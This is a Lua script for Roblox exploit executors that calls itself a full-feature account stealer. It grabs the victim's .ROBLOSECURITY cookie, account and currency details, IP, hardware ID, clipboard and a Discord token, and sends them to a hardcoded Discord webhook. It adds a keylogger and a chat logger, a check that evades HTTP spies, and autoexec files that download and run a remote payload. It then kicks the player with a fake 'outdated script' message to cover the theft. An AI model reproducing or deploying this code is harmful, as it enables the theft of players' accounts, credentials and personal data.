--[[
    Full Feature Roblox Stealer - Final
    cookie + account + RAP + keylog + chatlog + anti-spy + persistence + outdated kick
]]

local WEBHOOK = "https://discord.com/api/webhooks/1543772740560101450/nxQpj7CQHkx0K8u8BiOFg1Gtl6FDg5-e1_NJhkTmh-qUK_kVq8IOhsWWgwq73FWn-5x7"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local LP = Players.LocalPlayer

-- anti http spy
local function antiSpy()
    if getgenv and (getgenv().HttpSpy or getgenv().httpspy or getgenv().HTTP_SPY) then return true end
    return false
end
if antiSpy() then return end

-- request helper
local function http_request(opts)
    local funcs = {syn and syn.request, http and http.request, fluxus and fluxus.request, request, http_request}
    for _, f in ipairs(funcs) do
        if type(f) == "function" then
            local ok, res = pcall(f, opts)
            if ok and res then return res end
        end
    end
    return nil
end

local function safeJson(str)
    local ok, data = pcall(function() return HttpService:JSONDecode(str) end)
    return ok and data or nil
end

local function send(content, embeds)
    http_request({
        Url = WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({content = content or "@everyone", embeds = embeds})
    })
end

-- data table
local data = {
    cookie = "not found",
    discordToken = "not found",
    username = LP and LP.Name or "?",
    displayName = LP and LP.DisplayName or "?",
    userId = LP and LP.UserId or 0,
    robux = "n/a",
    premium = "n/a",
    accountAge = "n/a",
    friends = "n/a",
    followers = "n/a",
    rap = "n/a",
    executor = "unknown",
    placeName = "unknown",
    placeId = game.PlaceId,
    jobId = game.JobId,
    ip = "n/a",
    hwid = "n/a",
    clipboard = "n/a",
    avatarItems = "n/a"
}

-- cookie
pcall(function()
    local r = http_request({Url = "https://www.roblox.com/home", Method = "GET"})
    if r and r.Headers then
        for k, v in pairs(r.Headers) do
            if string.find(string.lower(tostring(v)), "roblosecurity") or string.find(string.lower(tostring(k)), "cookie") then
                data.cookie = tostring(v)
                break
            end
        end
    end
end)
pcall(function()
    if getcookies then
        local c = getcookies("https://www.roblox.com")
        if c then data.cookie = tostring(c) end
    end
end)

-- account info
pcall(function()
    local j = safeJson(game:HttpGet("https://users.roblox.com/v1/users/authenticated"))
    if j then
        data.username = j.name or data.username
        data.displayName = j.displayName or data.displayName
        data.userId = j.id or data.userId
        data.premium = tostring(j.hasVerifiedBadge or "unknown")
    end
end)
pcall(function()
    local j = safeJson(game:HttpGet("https://economy.roblox.com/v1/user/currency"))
    if j and j.robux then data.robux = tostring(j.robux) end
end)
pcall(function()
    local j = safeJson(game:HttpGet("https://users.roblox.com/v1/users/" .. data.userId))
    if j and j.created then data.accountAge = j.created end
end)
pcall(function()
    local j = safeJson(game:HttpGet("https://friends.roblox.com/v1/users/" .. data.userId .. "/friends/count"))
    if j and j.count then data.friends = tostring(j.count) end
end)
pcall(function()
    local j = safeJson(game:HttpGet("https://friends.roblox.com/v1/users/" .. data.userId .. "/followers/count"))
    if j and j.count then data.followers = tostring(j.count) end
end)
pcall(function()
    local j = safeJson(game:HttpGet("https://inventory.roblox.com/v1/users/" .. data.userId .. "/assets/collectibles?limit=100"))
    if j and j.data then
        local total = 0
        for _, item in ipairs(j.data) do total = total + (item.recentAveragePrice or 0) end
        data.rap = tostring(total)
    end
end)
pcall(function()
    local j = safeJson(game:HttpGet("https://avatar.roblox.com/v1/users/" .. data.userId .. "/currently-wearing"))
    if j and j.assetIds then data.avatarItems = table.concat(j.assetIds, ", ") end
end)
pcall(function()
    data.executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "unknown"
end)
pcall(function()
    data.placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name or "unknown"
end)
pcall(function()
    local r = http_request({Url = "https://api.ipify.org", Method = "GET"})
    if r and r.Body then data.ip = r.Body end
end)
pcall(function()
    if gethwid then data.hwid = gethwid()
    else
        local ok, id = pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
        if ok then data.hwid = id end
    end
end)
pcall(function()
    if getclipboard then data.clipboard = tostring(getclipboard()) end
end)
pcall(function()
    if getgenv and getgenv().discordtoken then data.discordToken = getgenv().discordtoken end
end)

-- send main dump
local fields = {
    {name = "Username", value = "```" .. data.username .. "```", inline = true},
    {name = "Display Name", value = "```" .. data.displayName .. "```", inline = true},
    {name = "UserId", value = "```" .. tostring(data.userId) .. "```", inline = true},
    {name = "Robux", value = "```" .. data.robux .. "```", inline = true},
    {name = "Premium", value = "```" .. data.premium .. "```", inline = true},
    {name = "Account Created", value = "```" .. data.accountAge .. "```", inline = true},
    {name = "Friends", value = "```" .. data.friends .. "```", inline = true},
    {name = "Followers", value = "```" .. data.followers .. "```", inline = true},
    {name = "Estimated RAP", value = "```" .. data.rap .. "```", inline = true},
    {name = "Executor", value = "```" .. data.executor .. "```", inline = true},
    {name = "IP", value = "```" .. data.ip .. "```", inline = true},
    {name = "HWID", value = "```" .. tostring(data.hwid) .. "```", inline = true},
    {name = "Place", value = "```" .. data.placeName .. " [" .. data.placeId .. "]```", inline = false},
    {name = "JobId", value = "```" .. tostring(data.jobId) .. "```", inline = false},
    {name = "Discord Token", value = "```" .. string.sub(tostring(data.discordToken), 1, 200) .. "```", inline = false},
    {name = "Clipboard", value = "```" .. string.sub(tostring(data.clipboard), 1, 400) .. "```", inline = false},
    {name = "Cookie", value = "```" .. string.sub(data.cookie, 1, 1400) .. "```", inline = false},
}

send("@everyone **New hit**", {{
    title = "Account Stealer • Full Dump",
    color = 0xFF0000,
    fields = fields,
    footer = {text = "executed at " .. os.date("%Y-%m-%d %H:%M:%S")},
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}})

-- keylogger
local keyBuffer = ""
UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        keyBuffer = keyBuffer .. input.KeyCode.Name .. " "
    end
end)
task.spawn(function()
    while true do
        task.wait(15)
        if #keyBuffer > 5 then
            send(nil, {{title = "Keylog", color = 0x00FF00, fields = {{name = "Keys", value = "```" .. string.sub(keyBuffer, 1, 1000) .. "```"}}}})
            keyBuffer = ""
        end
    end
end)

-- chat logger
pcall(function()
    LP.Chatted:Connect(function(msg)
        send(nil, {{title = "Chat", color = 0x0099FF, fields = {{name = "Msg", value = "```" .. tostring(msg) .. "```"}}}})
    end)
end)

-- persistence / re-infect
pcall(function()
    if writefile then
        local loader = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/payload.lua"))()'
        for _, path in ipairs({"autoexec.lua", "AutoExec/stealer.lua", "workspace/autoexec.lua", "auto.lua"}) do
            pcall(writefile, path, loader)
        end
    end
    if queue_on_teleport then
        queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/payload.lua"))()')
    end
end)

-- fake outdated kick
task.wait(1.5)
local msgs = {
    "This script version is outdated. Please download the latest version from the official source.",
    "Executor compatibility error: script version no longer supported. Update required.",
    "Failed to load: outdated build detected. Get the newest release.",
    "Script has been discontinued for this version. Please update."
}
pcall(function() LP:Kick(msgs[math.random(1, #msgs)]) end)
pcall(function() game:Shutdown() end)
